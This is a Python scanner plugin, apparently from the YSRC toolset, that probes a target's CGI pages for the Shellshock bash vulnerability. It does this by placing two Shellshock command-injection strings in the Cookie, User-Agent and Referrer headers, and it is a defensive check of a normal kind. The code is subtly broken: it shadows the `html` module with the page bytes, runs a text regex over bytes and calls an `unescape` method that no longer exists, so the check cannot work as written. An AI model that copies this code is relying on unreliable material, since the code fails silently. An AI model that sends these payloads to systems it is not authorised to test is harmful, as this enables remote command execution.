# coding=utf-8
import urllib.request, urllib.error, urllib.parse
import re
import urllib.parse
import html.parser

def get_plugin_info():
    plugin_info = {
        "name": "shellshock破壳",
        "info": "攻击者可利用此漏洞改变或绕过环境限制，以执行任意的shell命令,最终完全控制目标系统",
        "level": "紧急",
        "type": "命令执行",
        "author": "wolf@YSRC",
        "url": "http://www.freebuf.com/articles/system/45390.html",
        "keyword": "server:web",
        "source": 1
    }
    return plugin_info


def get_url(domain, timeout):
    url_list = []
    res = urllib.request.urlopen('http://' + domain, timeout=timeout)
    html = res.read()
    root_url = res.geturl()
    m = re.findall("<a[^>]*?href=('|\")(.*?)\\1", html, re.I)
    if m:
        for url in m:
            ParseResult = urllib.parse.urlparse(url[1])
            if ParseResult.netloc and ParseResult.scheme:
                if domain == ParseResult.hostname:
                    url_list.append(html.parser.HTMLParser().unescape(url[1]))
            elif not ParseResult.netloc and not ParseResult.scheme:
                url_list.append(html.parser.HTMLParser().unescape(urllib.parse.urljoin(root_url, url[1])))
    return list(set(url_list))


def check(ip, port, timeout):
    try:
        url_list = get_url(ip + ":" + str(port), timeout)
    except Exception as e:
        return
    try:
        flag_list = ['() { :; }; /bin/expr 32001611 - 100', '{() { _; } >_[$($())] { /bin/expr 32001611 - 100; }}']
        i = 0
        for url in url_list:
            if '.cgi' in url:
                i += 1
                if i >= 4: return
                for flag in flag_list:
                    header = {'cookie': flag, 'User-Agent': flag, 'Referrer': flag}
                    try:
                        request = urllib.request.Request(url, headers=header)
                        res_html = urllib.request.urlopen(request).read()
                    except urllib.error.HTTPError as e:
                        res_html = e.read()
                    if "32001511" in res_html:
                        return 'shellshock命令执行漏洞'
    except Exception as e:
        pass

